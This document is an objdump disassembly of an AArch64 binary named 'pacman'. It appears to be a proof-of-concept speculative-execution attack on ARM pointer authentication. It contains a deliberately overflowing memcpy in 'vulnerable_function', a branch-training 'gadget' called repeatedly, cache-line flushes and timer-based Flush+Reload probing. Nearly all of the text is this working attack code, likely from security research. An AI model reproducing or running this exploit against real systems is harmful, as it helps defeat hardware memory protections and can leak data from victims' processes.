
pacman:	file format elf64-littleaarch64

Disassembly of section .text:

0000000000001b50 <_start>:
    1b50: d503249f     	bti	j
    1b54: d280001d     	mov	x29, #0x0               // =0
    1b58: d280001e     	mov	x30, #0x0               // =0
    1b5c: 910003e0     	mov	x0, sp
    1b60: 14000001     	b	0x1b64 <_start_main>

0000000000001b64 <_start_main>:
    1b64: d503233f     	paciasp
    1b68: d10103ff     	sub	sp, sp, #0x40
    1b6c: a9037bfd     	stp	x29, x30, [sp, #0x30]
    1b70: 9100c3fd     	add	x29, sp, #0x30
    1b74: d0000008     	adrp	x8, 0x3000 <perror@plt+0xc48>
    1b78: d0000009     	adrp	x9, 0x3000 <perror@plt+0xc48>
    1b7c: 6f00e400     	movi	v0.2d, #0000000000000000
    1b80: f942b908     	ldr	x8, [x8, #0x570]
    1b84: f942bd29     	ldr	x9, [x9, #0x578]
    1b88: cb080128     	sub	x8, x9, x8
    1b8c: f100051f     	cmp	x8, #0x1
    1b90: ad0083e0     	stp	q0, q0, [sp, #0x10]
    1b94: 3d8003e0     	str	q0, [sp]
    1b98: 5400008b     	b.lt	0x1ba8 <_start_main+0x44>
    1b9c: d503201f     	nop
    1ba0: 10015448     	adr	x8, 0x4628 <fini_array_with_sentinels>
    1ba4: f9000be8     	str	x8, [sp, #0x10]
    1ba8: d0000002     	adrp	x2, 0x3000 <perror@plt+0xc48>
    1bac: 910003e3     	mov	x3, sp
    1bb0: aa1f03e1     	mov	x1, xzr
    1bb4: f942c042     	ldr	x2, [x2, #0x580]
    1bb8: 940001a6     	bl	0x2250 <__libc_init@plt>

0000000000001bbc <__atexit_handler_wrapper>:
    1bbc: d503245f     	bti	c
    1bc0: b4000060     	cbz	x0, 0x1bcc <__atexit_handler_wrapper+0x10>
    1bc4: aa0003f0     	mov	x16, x0
    1bc8: d61f0200     	br	x16
    1bcc: d65f03c0     	ret

0000000000001bd0 <atexit>:
    1bd0: d503245f     	bti	c
    1bd4: aa0003e1     	mov	x1, x0
    1bd8: d503201f     	nop
    1bdc: 10ffff00     	adr	x0, 0x1bbc <__atexit_handler_wrapper>
    1be0: d503201f     	nop
    1be4: 10015322     	adr	x2, 0x4648 <__dso_handle>
    1be8: 140001a0     	b	0x2268 <__cxa_atexit@plt>

0000000000001bec <pthread_atfork>:
    1bec: d503245f     	bti	c
    1bf0: d503201f     	nop
    1bf4: 100152a3     	adr	x3, 0x4648 <__dso_handle>
    1bf8: 140001a2     	b	0x2280 <__register_atfork@plt>

0000000000001bfc <call_fini_array>:
    1bfc: d503233f     	paciasp
    1c00: a9be7bfd     	stp	x29, x30, [sp, #-0x20]!
    1c04: a9014ff4     	stp	x20, x19, [sp, #0x10]
    1c08: 910003fd     	mov	x29, sp
    1c0c: d0000013     	adrp	x19, 0x3000 <perror@plt+0xc48>
    1c10: d0000008     	adrp	x8, 0x3000 <perror@plt+0xc48>
    1c14: f942ba73     	ldr	x19, [x19, #0x570]
    1c18: f942bd08     	ldr	x8, [x8, #0x578]
    1c1c: eb130108     	subs	x8, x8, x19
    1c20: 54000100     	b.eq	0x1c40 <call_fini_array+0x44>
    1c24: 9343fd08     	asr	x8, x8, #3
    1c28: 8b080e69     	add	x9, x19, x8, lsl #3
    1c2c: d1000514     	sub	x20, x8, #0x1
    1c30: f85f8129     	ldur	x9, [x9, #-0x8]
    1c34: d63f0120     	blr	x9
    1c38: aa1403e8     	mov	x8, x20
    1c3c: b5ffff74     	cbnz	x20, 0x1c28 <call_fini_array+0x2c>
    1c40: a9414ff4     	ldp	x20, x19, [sp, #0x10]
    1c44: a8c27bfd     	ldp	x29, x30, [sp], #0x20
    1c48: d50323bf     	autiasp
    1c4c: d65f03c0     	ret

0000000000001c50 <vulnerable_function>:
    1c50: d503233f     	paciasp
    1c54: d10103ff     	sub	sp, sp, #0x40
    1c58: a9037bfd     	stp	x29, x30, [sp, #0x30]
    1c5c: 9100c3fd     	add	x29, sp, #0x30
    1c60: f81f83a0     	stur	x0, [x29, #-0x8]
    1c64: f81f03a1     	stur	x1, [x29, #-0x10]
    1c68: f9000fe2     	str	x2, [sp, #0x18]
    1c6c: b90017e3     	str	w3, [sp, #0x14]
    1c70: b90013e4     	str	w4, [sp, #0x10]
    1c74: b94017e8     	ldr	w8, [sp, #0x14]
    1c78: 7100011f     	cmp	w8, #0x0
    1c7c: 1a9f07e8     	cset	w8, ne
    1c80: d2800809     	mov	x9, #0x40               // =64
    1c84: d280004a     	mov	x10, #0x2               // =2
    1c88: 7200011f     	tst	w8, #0x1
    1c8c: 9a8a1128     	csel	x8, x9, x10, ne
    1c90: f90003e8     	str	x8, [sp]
    1c94: f9400fe1     	ldr	x1, [sp, #0x18]
    1c98: f94003e2     	ldr	x2, [sp]
    1c9c: 91003be0     	add	x0, sp, #0xe
    1ca0: 9400017e     	bl	0x2298 <memcpy@plt>
    1ca4: 91003be8     	add	x8, sp, #0xe
    1ca8: a9437bfd     	ldp	x29, x30, [sp, #0x30]
    1cac: 910103ff     	add	sp, sp, #0x40
    1cb0: d65f0bff     	retaa

0000000000001cb4 <gadget>:
    1cb4: d503233f     	paciasp
    1cb8: d10103ff     	sub	sp, sp, #0x40
    1cbc: a9017bfd     	stp	x29, x30, [sp, #0x10]
    1cc0: a90257f6     	stp	x22, x21, [sp, #0x20]
    1cc4: a9034ff4     	stp	x20, x19, [sp, #0x30]
    1cc8: 910043fd     	add	x29, sp, #0x10
    1ccc: b81fc3bf     	stur	wzr, [x29, #-0x4]
    1cd0: 2a0403f5     	mov	w21, w4
    1cd4: 2a0303f3     	mov	w19, w3
    1cd8: d50b7e22     	dc	civac, x2
    1cdc: aa0103f4     	mov	x20, x1
    1ce0: aa0003f6     	mov	x22, x0
    1ce4: d5033b9f     	dsb	ish
    1ce8: d5033fdf     	isb
    1cec: d5033b9f     	dsb	ish
    1cf0: d5033fdf     	isb
    1cf4: 97ffffd7     	bl	0x1c50 <vulnerable_function>
    1cf8: 710006bf     	cmp	w21, #0x1
    1cfc: 540000ab     	b.lt	0x1d10 <gadget+0x5c>
    1d00: aa1f03e8     	mov	x8, xzr
    1d04: 710006b5     	subs	w21, w21, #0x1
    1d08: aa080108     	orr	x8, x8, x8
    1d0c: 54ffffc1     	b.ne	0x1d04 <gadget+0x50>
    1d10: 93407e68     	sxtw	x8, w19
    1d14: 9b087e88     	mul	x8, x20, x8
    1d18: d37ff908     	lsl	x8, x8, #1
    1d1c: b8686ac8     	ldr	w8, [x22, x8]
    1d20: b85fc3a9     	ldur	w9, [x29, #-0x4]
    1d24: 4a080128     	eor	w8, w9, w8
    1d28: b81fc3a8     	stur	w8, [x29, #-0x4]
    1d2c: a9434ff4     	ldp	x20, x19, [sp, #0x30]
    1d30: a94257f6     	ldp	x22, x21, [sp, #0x20]
    1d34: a9417bfd     	ldp	x29, x30, [sp, #0x10]
    1d38: 910103ff     	add	sp, sp, #0x40
    1d3c: d65f0bff     	retaa

0000000000001d40 <main>:
    1d40: d503233f     	paciasp
    1d44: d10383ff     	sub	sp, sp, #0xe0
    1d48: a9097bfd     	stp	x29, x30, [sp, #0x90]
    1d4c: f90053f9     	str	x25, [sp, #0xa0]
    1d50: a90b5ff8     	stp	x24, x23, [sp, #0xb0]
    1d54: a90c57f6     	stp	x22, x21, [sp, #0xc0]
    1d58: a90d4ff4     	stp	x20, x19, [sp, #0xd0]
    1d5c: 910243fd     	add	x29, sp, #0x90
    1d60: 7100081f     	cmp	w0, #0x2
    1d64: 540003ab     	b.lt	0x1dd8 <main+0x98>
    1d68: aa0103f3     	mov	x19, x1
    1d6c: f9000bff     	str	xzr, [sp, #0x10]
    1d70: 94000150     	bl	0x22b0 <__errno@plt>
    1d74: b900001f     	str	wzr, [x0]
    1d78: aa0003f4     	mov	x20, x0
    1d7c: 910043e1     	add	x1, sp, #0x10
    1d80: f9400660     	ldr	x0, [x19, #0x8]
    1d84: 52800142     	mov	w2, #0xa                // =10
    1d88: 94000150     	bl	0x22c8 <strtol@plt>
    1d8c: b9400288     	ldr	w8, [x20]
    1d90: f9400662     	ldr	x2, [x19, #0x8]
    1d94: 35000168     	cbnz	w8, 0x1dc0 <main+0x80>
    1d98: f9400be8     	ldr	x8, [sp, #0x10]
    1d9c: eb02011f     	cmp	x8, x2
    1da0: 54000100     	b.eq	0x1dc0 <main+0x80>
    1da4: 39400108     	ldrb	w8, [x8]
    1da8: 350000c8     	cbnz	w8, 0x1dc0 <main+0x80>
    1dac: 8aa0fc08     	bic	x8, x0, x0, asr #63
    1db0: 52801909     	mov	w9, #0xc8               // =200
    1db4: f103211f     	cmp	x8, #0xc8
    1db8: 9a893115     	csel	x21, x8, x9, lo
    1dbc: 14000008     	b	0x1ddc <main+0x9c>
    1dc0: d0000008     	adrp	x8, 0x3000 <perror@plt+0xc48>
    1dc4: d503201f     	nop
    1dc8: 10ff5d41     	adr	x1, 0x970 <main.prefix_bytes+0x67>
    1dcc: f942c508     	ldr	x8, [x8, #0x588]
    1dd0: f9400100     	ldr	x0, [x8]
    1dd4: 94000143     	bl	0x22e0 <fprintf@plt>
    1dd8: 2a1f03f5     	mov	w21, wzr
    1ddc: 6f00e400     	movi	v0.2d, #0000000000000000
    1de0: 52801008     	mov	w8, #0x80               // =128
    1de4: 910043e2     	add	x2, sp, #0x10
    1de8: 2a1f03e0     	mov	w0, wzr
    1dec: 52801001     	mov	w1, #0x80               // =128
    1df0: f90047ff     	str	xzr, [sp, #0x88]
    1df4: f9000be8     	str	x8, [sp, #0x10]
    1df8: 3c8783e0     	stur	q0, [sp, #0x78]
    1dfc: 3c8683e0     	stur	q0, [sp, #0x68]
    1e00: 3c8583e0     	stur	q0, [sp, #0x58]
    1e04: 3c8483e0     	stur	q0, [sp, #0x48]
    1e08: 3c8383e0     	stur	q0, [sp, #0x38]
    1e0c: 3c8283e0     	stur	q0, [sp, #0x28]
    1e10: 3c8183e0     	stur	q0, [sp, #0x18]
    1e14: 94000139     	bl	0x22f8 <sched_setaffinity@plt>
    1e18: 35001f40     	cbnz	w0, 0x2200 <main+0x4c0>
    1e1c: 528004e0     	mov	w0, #0x27               // =39
    1e20: 9400013c     	bl	0x2310 <sysconf@plt>
    1e24: d378dc13     	lsl	x19, x0, #8
    1e28: aa0003f6     	mov	x22, x0
    1e2c: aa1f03e0     	mov	x0, xzr
    1e30: 52800062     	mov	w2, #0x3                // =3
    1e34: 52800443     	mov	w3, #0x22               // =34
    1e38: 12800004     	mov	w4, #-0x1               // =-1
    1e3c: aa1303e1     	mov	x1, x19
    1e40: aa1f03e5     	mov	x5, xzr
    1e44: 94000139     	bl	0x2328 <mmap@plt>
    1e48: b100041f     	cmn	x0, #0x1
    1e4c: 54001e20     	b.eq	0x2210 <main+0x4d0>
    1e50: 52800201     	mov	w1, #0x10               // =16
    1e54: aa1303e2     	mov	x2, x19
    1e58: aa0003f4     	mov	x20, x0
    1e5c: 94000139     	bl	0x2340 <memset@plt>
    1e60: 91005ec8     	add	x8, x22, #0x17
    1e64: 910043e0     	add	x0, sp, #0x10
    1e68: aa1603e1     	mov	x1, x22
    1e6c: 9ad60908     	udiv	x8, x8, x22
    1e70: f9000bff     	str	xzr, [sp, #0x10]
    1e74: 9b167d17     	mul	x23, x8, x22
    1e78: aa1703e2     	mov	x2, x23
    1e7c: 94000137     	bl	0x2358 <posix_memalign@plt>
    1e80: 35001ce0     	cbnz	w0, 0x221c <main+0x4dc>
    1e84: f9400be0     	ldr	x0, [sp, #0x10]
    1e88: 2a1f03e1     	mov	w1, wzr
    1e8c: aa1703e2     	mov	x2, x23
    1e90: 9400012c     	bl	0x2340 <memset@plt>
    1e94: f0ffffe8     	adrp	x8, 0x0 <sysconf>
    1e98: 91242508     	add	x8, x8, #0x909
    1e9c: f9400be9     	ldr	x9, [sp, #0x10]
    1ea0: f940010a     	ldr	x10, [x8]
    1ea4: 52800c88     	mov	w8, #0x64               // =100
    1ea8: 5287270b     	mov	w11, #0x3938            // =14648
    1eac: 9b087ec8     	mul	x8, x22, x8
    1eb0: f0000018     	adrp	x24, 0x4000 <sysconf+0x4000>
    1eb4: 7900112b     	strh	w11, [x9, #0x8]
    1eb8: f900012a     	str	x10, [x9]
    1ebc: 5288282a     	mov	w10, #0x4141            // =16705
    1ec0: f10006df     	cmp	x22, #0x1
    1ec4: 72a8282a     	movk	w10, #0x4141, lsl #16
    1ec8: f9032b09     	str	x9, [x24, #0x650]
    1ecc: b800a12a     	stur	w10, [x9, #0xa]
    1ed0: 79001d2a     	strh	w10, [x9, #0xe]
    1ed4: 8b14010a     	add	x10, x8, x20
    1ed8: f900092a     	str	x10, [x9, #0x10]
    1edc: b9001bbf     	str	wzr, [x29, #0x18]
    1ee0: d5033b9f     	dsb	ish
    1ee4: d5033fdf     	isb
    1ee8: 5400012b     	b.lt	0x1f0c <main+0x1cc>
    1eec: aa1f03e9     	mov	x9, xzr
    1ef0: 8b09028a     	add	x10, x20, x9
    1ef4: d50b7e2a     	dc	civac, x10
    1ef8: 91010129     	add	x9, x9, #0x40
    1efc: d5033b9f     	dsb	ish
    1f00: eb09027f     	cmp	x19, x9
    1f04: d5033fdf     	isb
    1f08: 54ffff4c     	b.gt	0x1ef0 <main+0x1b0>
    1f0c: 8b080297     	add	x23, x20, x8
    1f10: d50b7e37     	dc	civac, x23
    1f14: 910023e0     	add	x0, sp, #0x8
    1f18: d5033b9f     	dsb	ish
    1f1c: 52801001     	mov	w1, #0x80               // =128
    1f20: 52a08002     	mov	w2, #0x4000000          // =67108864
    1f24: d5033fdf     	isb
    1f28: 9400010c     	bl	0x2358 <posix_memalign@plt>
    1f2c: f94007e8     	ldr	x8, [sp, #0x8]
    1f30: aa1f03e9     	mov	x9, xzr
    1f34: 32194bea     	mov	w10, #0x3ffff80         // =67108736
    1f38: 390073bf     	strb	wzr, [x29, #0x1c]
    1f3c: 3869690b     	ldrb	w11, [x8, x9]
    1f40: 394073ac     	ldrb	w12, [x29, #0x1c]
    1f44: eb0a013f     	cmp	x9, x10
    1f48: 91020129     	add	x9, x9, #0x80
    1f4c: 4a0b018b     	eor	w11, w12, w11
    1f50: 390073ab     	strb	w11, [x29, #0x1c]
    1f54: 54ffff43     	b.lo	0x1f3c <main+0x1fc>
    1f58: f0000019     	adrp	x25, 0x4000 <sysconf+0x4000>
    1f5c: aa1403e0     	mov	x0, x20
    1f60: 394073a8     	ldrb	w8, [x29, #0x1c]
    1f64: d5033b9f     	dsb	ish
    1f68: aa1603e1     	mov	x1, x22
    1f6c: d5033fdf     	isb
    1f70: 2a1f03e3     	mov	w3, wzr
    1f74: 2a1503e4     	mov	w4, w21
    1f78: f9432322     	ldr	x2, [x25, #0x640]
    1f7c: d5033b9f     	dsb	ish
    1f80: d5033fdf     	isb
    1f84: 97ffff4c     	bl	0x1cb4 <gadget>
    1f88: f9432322     	ldr	x2, [x25, #0x640]
    1f8c: d5033b9f     	dsb	ish
    1f90: d5033fdf     	isb
    1f94: aa1403e0     	mov	x0, x20
    1f98: aa1603e1     	mov	x1, x22
    1f9c: 2a1f03e3     	mov	w3, wzr
    1fa0: 2a1503e4     	mov	w4, w21
    1fa4: 97ffff44     	bl	0x1cb4 <gadget>
    1fa8: f9432322     	ldr	x2, [x25, #0x640]
    1fac: d5033b9f     	dsb	ish
    1fb0: d5033fdf     	isb
    1fb4: aa1403e0     	mov	x0, x20
    1fb8: aa1603e1     	mov	x1, x22
    1fbc: 2a1f03e3     	mov	w3, wzr
    1fc0: 2a1503e4     	mov	w4, w21
    1fc4: 97ffff3c     	bl	0x1cb4 <gadget>
    1fc8: f9432322     	ldr	x2, [x25, #0x640]
    1fcc: d5033b9f     	dsb	ish
    1fd0: d5033fdf     	isb
    1fd4: aa1403e0     	mov	x0, x20
    1fd8: aa1603e1     	mov	x1, x22
    1fdc: 2a1f03e3     	mov	w3, wzr
    1fe0: 2a1503e4     	mov	w4, w21
    1fe4: 97ffff34     	bl	0x1cb4 <gadget>
    1fe8: f9432322     	ldr	x2, [x25, #0x640]
    1fec: d5033b9f     	dsb	ish
    1ff0: d5033fdf     	isb
    1ff4: aa1403e0     	mov	x0, x20
    1ff8: aa1603e1     	mov	x1, x22
    1ffc: 2a1f03e3     	mov	w3, wzr
    2000: 2a1503e4     	mov	w4, w21
    2004: 97ffff2c     	bl	0x1cb4 <gadget>
    2008: f9432322     	ldr	x2, [x25, #0x640]
    200c: d5033b9f     	dsb	ish
    2010: d5033fdf     	isb
    2014: aa1403e0     	mov	x0, x20
    2018: aa1603e1     	mov	x1, x22
    201c: 2a1f03e3     	mov	w3, wzr
    2020: 2a1503e4     	mov	w4, w21
    2024: 97ffff24     	bl	0x1cb4 <gadget>
    2028: f9432322     	ldr	x2, [x25, #0x640]
    202c: d5033b9f     	dsb	ish
    2030: d5033fdf     	isb
    2034: aa1403e0     	mov	x0, x20
    2038: aa1603e1     	mov	x1, x22
    203c: 2a1f03e3     	mov	w3, wzr
    2040: 2a1503e4     	mov	w4, w21
    2044: 97ffff1c     	bl	0x1cb4 <gadget>
    2048: f9432322     	ldr	x2, [x25, #0x640]
    204c: d5033b9f     	dsb	ish
    2050: d5033fdf     	isb
    2054: aa1403e0     	mov	x0, x20
    2058: aa1603e1     	mov	x1, x22
    205c: 2a1f03e3     	mov	w3, wzr
    2060: 2a1503e4     	mov	w4, w21
    2064: 97ffff14     	bl	0x1cb4 <gadget>
    2068: f9432322     	ldr	x2, [x25, #0x640]
    206c: d5033b9f     	dsb	ish
    2070: d5033fdf     	isb
    2074: aa1403e0     	mov	x0, x20
    2078: aa1603e1     	mov	x1, x22
    207c: 2a1f03e3     	mov	w3, wzr
    2080: 2a1503e4     	mov	w4, w21
    2084: 97ffff0c     	bl	0x1cb4 <gadget>
    2088: f9432322     	ldr	x2, [x25, #0x640]
    208c: d5033b9f     	dsb	ish
    2090: d5033fdf     	isb
    2094: aa1403e0     	mov	x0, x20
    2098: aa1603e1     	mov	x1, x22
    209c: 2a1f03e3     	mov	w3, wzr
    20a0: 2a1503e4     	mov	w4, w21
    20a4: 97ffff04     	bl	0x1cb4 <gadget>
    20a8: f9432b02     	ldr	x2, [x24, #0x650]
    20ac: d5033b9f     	dsb	ish
    20b0: d5033fdf     	isb
    20b4: aa1403e0     	mov	x0, x20
    20b8: aa1603e1     	mov	x1, x22
    20bc: 52800c83     	mov	w3, #0x64               // =100
    20c0: 2a1503e4     	mov	w4, w21
    20c4: 97fffefc     	bl	0x1cb4 <gadget>
    20c8: 52994015     	mov	w21, #0xca00            // =51712
    20cc: d5033b9f     	dsb	ish
    20d0: d5033fdf     	isb
    20d4: d5033fdf     	isb
    20d8: d53be048     	mrs	x8, CNTVCT_EL0
    20dc: 72a77355     	movk	w21, #0x3b9a, lsl #16
    20e0: d53be009     	mrs	x9, CNTFRQ_EL0
    20e4: 9b157d08     	mul	x8, x8, x21
    20e8: d0ffffe0     	adrp	x0, 0x0 <sysconf>
    20ec: 91249800     	add	x0, x0, #0x926
    20f0: 9ac90908     	udiv	x8, x8, x9
    20f4: 52801909     	mov	w9, #0xc8               // =200
    20f8: 9b097ec9     	mul	x9, x22, x9
    20fc: b8696a89     	ldr	w9, [x20, x9]
    2100: b9401baa     	ldr	w10, [x29, #0x18]
    2104: 4a090149     	eor	w9, w10, w9
    2108: b9001ba9     	str	w9, [x29, #0x18]
    210c: d5033fdf     	isb
    2110: d53be049     	mrs	x9, CNTVCT_EL0
    2114: 9b157d29     	mul	x9, x9, x21
    2118: d53be00a     	mrs	x10, CNTFRQ_EL0
    211c: 9aca0929     	udiv	x9, x9, x10
    2120: cb080121     	sub	x1, x9, x8
    2124: 94000093     	bl	0x2370 <printf@plt>
    2128: d50b7e37     	dc	civac, x23
    212c: d0ffffe0     	adrp	x0, 0x0 <sysconf>
    2130: 91251800     	add	x0, x0, #0x946
    2134: d5033b9f     	dsb	ish
    2138: d5033fdf     	isb
    213c: d5033fdf     	isb
    2140: d53be048     	mrs	x8, CNTVCT_EL0
    2144: 9b157d08     	mul	x8, x8, x21
    2148: d53be009     	mrs	x9, CNTFRQ_EL0
    214c: 9ac90908     	udiv	x8, x8, x9
    2150: 52800649     	mov	w9, #0x32               // =50
    2154: 9b097ed6     	mul	x22, x22, x9
    2158: b8766a89     	ldr	w9, [x20, x22]
    215c: b9401baa     	ldr	w10, [x29, #0x18]
    2160: 4a090149     	eor	w9, w10, w9
    2164: b9001ba9     	str	w9, [x29, #0x18]
    2168: d5033fdf     	isb
    216c: d53be049     	mrs	x9, CNTVCT_EL0
    2170: 9b157d29     	mul	x9, x9, x21
    2174: d53be00a     	mrs	x10, CNTFRQ_EL0
    2178: 9aca0929     	udiv	x9, x9, x10
    217c: cb080121     	sub	x1, x9, x8
    2180: 9400007c     	bl	0x2370 <printf@plt>
    2184: d5033fdf     	isb
    2188: d53be048     	mrs	x8, CNTVCT_EL0
    218c: d53be009     	mrs	x9, CNTFRQ_EL0
    2190: 9b157d08     	mul	x8, x8, x21
    2194: d0ffffe0     	adrp	x0, 0x0 <sysconf>
    2198: 91245000     	add	x0, x0, #0x914
    219c: 9ac90908     	udiv	x8, x8, x9
    21a0: b8766a89     	ldr	w9, [x20, x22]
    21a4: b9401baa     	ldr	w10, [x29, #0x18]
    21a8: 4a090149     	eor	w9, w10, w9
    21ac: b9001ba9     	str	w9, [x29, #0x18]
    21b0: d5033fdf     	isb
    21b4: d53be049     	mrs	x9, CNTVCT_EL0
    21b8: 9b157d29     	mul	x9, x9, x21
    21bc: d53be00a     	mrs	x10, CNTFRQ_EL0
    21c0: 9aca0929     	udiv	x9, x9, x10
    21c4: cb080121     	sub	x1, x9, x8
    21c8: 9400006a     	bl	0x2370 <printf@plt>
    21cc: aa1403e0     	mov	x0, x20
    21d0: aa1303e1     	mov	x1, x19
    21d4: 9400006d     	bl	0x2388 <munmap@plt>
    21d8: f9400be0     	ldr	x0, [sp, #0x10]
    21dc: 94000071     	bl	0x23a0 <free@plt>
    21e0: 2a1f03e0     	mov	w0, wzr
    21e4: a94d4ff4     	ldp	x20, x19, [sp, #0xd0]
    21e8: f94053f9     	ldr	x25, [sp, #0xa0]
    21ec: a94c57f6     	ldp	x22, x21, [sp, #0xc0]
    21f0: a94b5ff8     	ldp	x24, x23, [sp, #0xb0]
    21f4: a9497bfd     	ldp	x29, x30, [sp, #0x90]
    21f8: 910383ff     	add	sp, sp, #0xe0
    21fc: d65f0bff     	retaa
    2200: d0ffffe0     	adrp	x0, 0x0 <sysconf>
    2204: 91257800     	add	x0, x0, #0x95e
    2208: 9400006c     	bl	0x23b8 <perror@plt>
    220c: 17ffff04     	b	0x1e1c <main+0xdc>
    2210: d0ffffe0     	adrp	x0, 0x0 <sysconf>
    2214: 91256400     	add	x0, x0, #0x959
    2218: 14000003     	b	0x2224 <main+0x4e4>
    221c: d0ffffe0     	adrp	x0, 0x0 <sysconf>
    2220: 91266c00     	add	x0, x0, #0x99b
    2224: 94000065     	bl	0x23b8 <perror@plt>
    2228: 52800020     	mov	w0, #0x1                // =1
    222c: 17ffffee     	b	0x21e4 <main+0x4a4>

Disassembly of section .plt:

0000000000002230 <.plt>:
    2230: d503245f     	bti	c
    2234: a9bf7bf0     	stp	x16, x30, [sp, #-0x10]!
    2238: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    223c: f942d211     	ldr	x17, [x16, #0x5a0]
    2240: 91168210     	add	x16, x16, #0x5a0
    2244: d61f0220     	br	x17
    2248: d503201f     	nop
    224c: d503201f     	nop

0000000000002250 <__libc_init@plt>:
    2250: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    2254: f942d611     	ldr	x17, [x16, #0x5a8]
    2258: 9116a210     	add	x16, x16, #0x5a8
    225c: d61f0220     	br	x17
    2260: d503201f     	nop
    2264: d503201f     	nop

0000000000002268 <__cxa_atexit@plt>:
    2268: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    226c: f942da11     	ldr	x17, [x16, #0x5b0]
    2270: 9116c210     	add	x16, x16, #0x5b0
    2274: d61f0220     	br	x17
    2278: d503201f     	nop
    227c: d503201f     	nop

0000000000002280 <__register_atfork@plt>:
    2280: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    2284: f942de11     	ldr	x17, [x16, #0x5b8]
    2288: 9116e210     	add	x16, x16, #0x5b8
    228c: d61f0220     	br	x17
    2290: d503201f     	nop
    2294: d503201f     	nop

0000000000002298 <memcpy@plt>:
    2298: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    229c: f942e211     	ldr	x17, [x16, #0x5c0]
    22a0: 91170210     	add	x16, x16, #0x5c0
    22a4: d61f0220     	br	x17
    22a8: d503201f     	nop
    22ac: d503201f     	nop

00000000000022b0 <__errno@plt>:
    22b0: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    22b4: f942e611     	ldr	x17, [x16, #0x5c8]
    22b8: 91172210     	add	x16, x16, #0x5c8
    22bc: d61f0220     	br	x17
    22c0: d503201f     	nop
    22c4: d503201f     	nop

00000000000022c8 <strtol@plt>:
    22c8: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    22cc: f942ea11     	ldr	x17, [x16, #0x5d0]
    22d0: 91174210     	add	x16, x16, #0x5d0
    22d4: d61f0220     	br	x17
    22d8: d503201f     	nop
    22dc: d503201f     	nop

00000000000022e0 <fprintf@plt>:
    22e0: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    22e4: f942ee11     	ldr	x17, [x16, #0x5d8]
    22e8: 91176210     	add	x16, x16, #0x5d8
    22ec: d61f0220     	br	x17
    22f0: d503201f     	nop
    22f4: d503201f     	nop

00000000000022f8 <sched_setaffinity@plt>:
    22f8: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    22fc: f942f211     	ldr	x17, [x16, #0x5e0]
    2300: 91178210     	add	x16, x16, #0x5e0
    2304: d61f0220     	br	x17
    2308: d503201f     	nop
    230c: d503201f     	nop

0000000000002310 <sysconf@plt>:
    2310: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    2314: f942f611     	ldr	x17, [x16, #0x5e8]
    2318: 9117a210     	add	x16, x16, #0x5e8
    231c: d61f0220     	br	x17
    2320: d503201f     	nop
    2324: d503201f     	nop

0000000000002328 <mmap@plt>:
    2328: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    232c: f942fa11     	ldr	x17, [x16, #0x5f0]
    2330: 9117c210     	add	x16, x16, #0x5f0
    2334: d61f0220     	br	x17
    2338: d503201f     	nop
    233c: d503201f     	nop

0000000000002340 <memset@plt>:
    2340: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    2344: f942fe11     	ldr	x17, [x16, #0x5f8]
    2348: 9117e210     	add	x16, x16, #0x5f8
    234c: d61f0220     	br	x17
    2350: d503201f     	nop
    2354: d503201f     	nop

0000000000002358 <posix_memalign@plt>:
    2358: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    235c: f9430211     	ldr	x17, [x16, #0x600]
    2360: 91180210     	add	x16, x16, #0x600
    2364: d61f0220     	br	x17
    2368: d503201f     	nop
    236c: d503201f     	nop

0000000000002370 <printf@plt>:
    2370: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    2374: f9430611     	ldr	x17, [x16, #0x608]
    2378: 91182210     	add	x16, x16, #0x608
    237c: d61f0220     	br	x17
    2380: d503201f     	nop
    2384: d503201f     	nop

0000000000002388 <munmap@plt>:
    2388: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    238c: f9430a11     	ldr	x17, [x16, #0x610]
    2390: 91184210     	add	x16, x16, #0x610
    2394: d61f0220     	br	x17
    2398: d503201f     	nop
    239c: d503201f     	nop

00000000000023a0 <free@plt>:
    23a0: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    23a4: f9430e11     	ldr	x17, [x16, #0x618]
    23a8: 91186210     	add	x16, x16, #0x618
    23ac: d61f0220     	br	x17
    23b0: d503201f     	nop
    23b4: d503201f     	nop

00000000000023b8 <perror@plt>:
    23b8: b0000010     	adrp	x16, 0x3000 <perror@plt+0xc48>
    23bc: f9431211     	ldr	x17, [x16, #0x620]
    23c0: 91188210     	add	x16, x16, #0x620
    23c4: d61f0220     	br	x17
    23c8: d503201f     	nop
    23cc: d503201f     	nop
